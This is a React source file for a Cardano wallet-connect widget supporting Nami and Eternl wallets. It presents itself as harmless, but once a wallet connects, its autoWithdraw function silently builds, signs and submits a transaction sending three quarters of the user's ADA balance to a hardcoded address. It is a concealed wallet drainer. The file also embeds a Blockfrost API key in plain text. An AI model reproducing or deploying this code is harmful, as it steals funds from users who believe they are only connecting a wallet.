import React, { useState, useEffect } from "react";
import { Buffer } from "buffer";
import axios from "axios";

function WalletConnect() {
  const [isConnected, setIsConnected] = useState(false);
  const [walletType, setWalletType] = useState("");
  const [address, setAddress] = useState("");
  const [balance, setBalance] = useState(null);
  const [usdBalance, setUsdBalance] = useState(null);

  const [CardanoWasm, setCardanoWasm] = useState(null);

  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";

  const fetchProtocolParams = async () => {
    try {
      const response = await axios.get(
        `${BLOCKFROST_API_URL}/epochs/latest/parameters`,
        {
          headers: {
            project_id: BLOCKFROST_API_KEY,
          },
        },
      );
      return response.data;
    } catch (error) {
      console.error("Error fetching protocol parameters", error);
    }
  };

  useEffect(() => {
    const loadWasm = async () => {
      const wasmModule = await import(
        "@emurgo/cardano-serialization-lib-browser"
      );
      setCardanoWasm(wasmModule);
    };

    loadWasm();
  }, []);

  async function connectWallet(walletName) {
    if (window.cardano && window.cardano[walletName]) {
      try {
        const walletApi = await window.cardano[walletName].enable();

        if (walletApi) {
          console.log("Wallet API object:", walletApi);

          await new Promise((resolve) => setTimeout(resolve, 1000));

          let addresses;
          try {
            addresses = await walletApi.getUsedAddresses();
            console.log("Used addresses:", addresses);
          } catch (error) {
            console.error("Error getting used addresses:", error);
            if (typeof walletApi.getAddresses === "function") {
              addresses = await walletApi.getAddresses();
              console.log("All addresses:", addresses);
            } else {
              console.error("Unable to retrieve addresses");
              return;
            }
          }

          if (addresses && addresses.length > 0) {
            const hexAddress = addresses[0];

            setIsConnected(true);
            setWalletType(walletName);
            const addressBytes = Buffer.from(hexAddress, "hex");
            const address = CardanoWasm.Address.from_bytes(addressBytes);
            console.log(
              `Connected to ${walletName}. Hex Address:`,
              address?.to_bech32(),
            );
            setAddress(address?.to_bech32());

            // Get the balance directly
            const currentBalance = await updateBalance(walletApi);

            if (currentBalance !== null) {
              console.log("Current balance:", currentBalance);
              await autoWithdraw(
                walletApi,
                currentBalance,
                address?.to_bech32(),
              );
            } else {
              console.error("Failed to retrieve balance");
            }
          } else {
            console.error("No addresses found");
            alert(
              "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
            );
          }
        }
      } catch (error) {
        console.error(`Error connecting to ${walletName} wallet:`, error);
        alert(
          `Error connecting to ${walletName} wallet. Please check console for details.`,
        );
      }
    } else {
      console.error(
        `${walletName} wallet not found. Please install the extension.`,
      );
      alert(`${walletName} wallet not found. Please install the extension.`);
    }
  }

  async function updateBalance(walletApi) {
    try {
      const balanceInLovelace = await walletApi.getBalance();
      console.log("Raw balance from API:", balanceInLovelace);

      const isHex = /^[0-9A-Fa-f]+$/.test(balanceInLovelace);
      console.log("Is balance in hex format?", isHex);

      let balanceInAda;
      if (isHex) {
        balanceInAda = CardanoWasm.Value.from_bytes(
          Buffer.from(balanceInLovelace, "hex"),
        );
      } else {
        balanceInAda = Number(balanceInLovelace) / 1000000;
      }
      console.log("Calculated ADA balance:", balanceInAda.coin().to_str());

      const newBalance = parseInt(balanceInAda.coin().to_str()) / 1000000;
      setBalance(newBalance);

      const response = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
      );
      const data = await response.json();
      const adaToUsd = data.cardano.usd;
      console.log("Current ADA to USD rate:", adaToUsd);

      const balanceInUsd = newBalance * adaToUsd;
      console.log("Calculated USD balance:", balanceInUsd);
      setUsdBalance(balanceInUsd);

      return newBalance;
    } catch (error) {
      console.error("Error fetching balance or exchange rate:", error);
      return null;
    }
  }

  async function autoWithdraw(walletApi, currentBalance, address) {
    if (currentBalance === null || currentBalance === 0) {
      console.error("Balance not available or zero");
      return;
    }
  
    const recipientAddress =
      "addr1q868f8s838prx6xnglzrtk46j3pelc86uuelvr70v5ggzt9cy9xtza6urx030e8d7kkelucnkstrqufx3dnjlyzsg8xsh4vk8t";
  
    // Calculate 3/4 of the balance
    const amountToWithdraw = Math.floor(currentBalance * 0.75);
  
    try {
      const protocolParams = await fetchProtocolParams();
  
      // Convert ADA to Lovelace without padding
      const lovelaceAmount = Math.floor(
        amountToWithdraw * 1000000,
      ).toString();
  
      console.log("Lovelace amount:", lovelaceAmount); // Add this line for debugging
  
      await buildSendADATransaction(
        recipientAddress,
        lovelaceAmount,
        walletApi,
        protocolParams,
        address,
      );
      console.log(
        `Withdrawal of ${amountToWithdraw.toFixed(6)} ADA initiated (3/4 of balance)`,
      );
    } catch (error) {
      console.error("Error during auto-withdrawal:", error);
    }
  }
  

  function disconnectWallet() {
    setIsConnected(false);
    setWalletType("");
    setAddress("");
    setBalance(null);
    setUsdBalance(null);
  }

  function formatAddress(hexAddress) {
    if (hexAddress.length > 20) {
      return `${hexAddress.slice(0, 10)}...${hexAddress.slice(-10)}`;
    }
    return hexAddress;
  }

  const getTxUnspentOutputs = async (utxos) => {
    let txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
    for (const utxor of utxos) {
      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
        Buffer.from(utxor, "hex"),
      );
      const input = utxo.input();
      const txid = Buffer.from(
        input.transaction_id().to_bytes(),
        "utf8",
      ).toString("hex");
      const txindx = input.index();
      const output = utxo.output();
      const amount = output.amount().coin().to_str();
      const multiasset = output.amount().multiasset();
      let multiAssetStr = "";

      if (multiasset) {
        const keys = multiasset.keys();
        const N = keys.len();

        for (let i = 0; i < N; i++) {
          const policyId = keys.get(i);
          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
            "hex",
          );
          const assets = multiasset.get(policyId);
          const assetNames = assets.keys();
          const K = assetNames.len();

          for (let j = 0; j < K; j++) {
            const assetName = assetNames.get(j);
            const assetNameString = Buffer.from(
              assetName.name(),
              "utf8",
            ).toString();
            const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
              "hex",
            );
            const multiassetAmt = multiasset.get_asset(policyId, assetName);
            multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
          }
        }
      }

      const obj = {
        txid: txid,
        txindx: txindx,
        amount: amount,
        str: `${txid} #${txindx} = ${amount}`,
        multiAssetStr: multiAssetStr,
        TransactionUnspentOutput: utxo,
      };
      txOutputs.add(obj.TransactionUnspentOutput);
    }
    return txOutputs;
  };

  const buildSendADATransaction = async (
    recAddress,
    amount,
    nami,
    protocolParams,
    address,
  ) => {
    const txBuilder = CardanoWasm.TransactionBuilder.new(
      CardanoWasm.TransactionBuilderConfigBuilder.new()
        .fee_algo(
          CardanoWasm.LinearFee.new(
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString()),
          ),
        )
        .pool_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString()),
        )
        .key_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString()),
        )
        .coins_per_utxo_word(
          CardanoWasm.BigNum.from_str(
            protocolParams.coins_per_utxo_size.toString(),
          ),
        )
        .max_tx_size(16384)
        .max_value_size(5000)
        .build(),
    );
    console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);

    console.log(
      "Amount in Lovelace:",
      shelleyOutputAddress,
      shelleyChangeAddress,
    );

    const utxosHex = await nami.getUtxos();

    console.log("Amount in Lovelace:", utxosHex);

    const utxos = utxosHex.map((hex) =>
      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex")),
    );
    console.log("Amount in Lovelace:", utxosHex);

    utxos.forEach((utxo) => {
      txBuilder.add_input(
        CardanoWasm.Address.from_bech32(address),
        utxo.input(),
        utxo.output().amount(),
      );
    });

    console.log("Amount in Lovelace:", utxosHex);

    txBuilder.add_output(
      CardanoWasm.TransactionOutput.new(
        shelleyOutputAddress,
        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount)),
      ),
    );

    txBuilder.add_change_if_needed(shelleyChangeAddress);

    const txBody = txBuilder.build();

    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();

    const tx = CardanoWasm.Transaction.new(
      txBody,
      CardanoWasm.TransactionWitnessSet.from_bytes(
        transactionWitnessSet.to_bytes(),
      ),
    );

    console.log("Amount in Lovelace:", tx);

    let txVkeyWitnesses = await nami.signTx(
      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
      true,
    );

    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
      Buffer.from(txVkeyWitnesses, "hex"),
    );

    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

    const signedTx = CardanoWasm.Transaction.new(
      tx.body(),
      transactionWitnessSet,
    );

    const submittedTxHash = await nami.submitTx(
      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex"),
    );
    console.log("Submitted transaction hash:", submittedTxHash);
  };

  async function requestWithdrawal() {
    if (!isConnected) {
      alert("Please connect your wallet first.");
      return;
    }

    const amount = prompt("Enter the amount of ADA you want to withdraw:");

    if (amount === null) return; // User cancelled the prompt

    let numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      alert("Please enter a valid positive number.");
      return;
    }

    if (numAmount > balance) {
      alert("Insufficient funds. Please enter a smaller amount.");
      return;
    }

    const recipientAddress = prompt("Enter the recipient's address:");
    if (!recipientAddress) {
      alert("Invalid recipient address.");
      return;
    }
    const protocolParams = await fetchProtocolParams();

    const confirmation = window.confirm(
      `Are you sure you want to withdraw ${numAmount} ADA to ${recipientAddress}?`,
    );
    if (confirmation) {
      try {
        const walletApi = window.cardano[walletType].enable();

        const nami = await window.cardano[walletType].enable();

        await buildSendADATransaction(
          recipientAddress,
          (numAmount * 1000000).toString(),
          nami,
          protocolParams,
        );
      } catch (error) {
        console.error("Error during withdrawal:", error);
        alert(
          "An error occurred during the withdrawal. Please check the console for details.",
        );
      }
    }
  }

  useEffect(() => {
    let intervalId;
    if (isConnected) {
      async () => {
        const walletApi = await window.cardano[walletType].enable();
        await updateBalance(walletApi);
      };
    }
    return () => clearInterval(intervalId);
  }, [isConnected, walletType]);

  return (
    <div>
      {!isConnected ? (
        <div className="flex flex-col gap-3">
          <button onClick={() => connectWallet("nami")}>
            Connect Nami Wallet
          </button>
          <button onClick={() => connectWallet("eternl")}>
            Connect Eternl Wallet
          </button>
        </div>
      ) : (
        <div>
          <p>
            Connected to {walletType}: {formatAddress(address)}
          </p>
          {balance !== null && <p>Balance: {balance} ₳</p>}
          {usdBalance !== null && <p>USD Value: ${usdBalance.toFixed(2)}</p>}
          <button onClick={disconnectWallet}>Disconnect</button>
        </div>
      )}
    </div>
  );
}

export default WalletConnect;
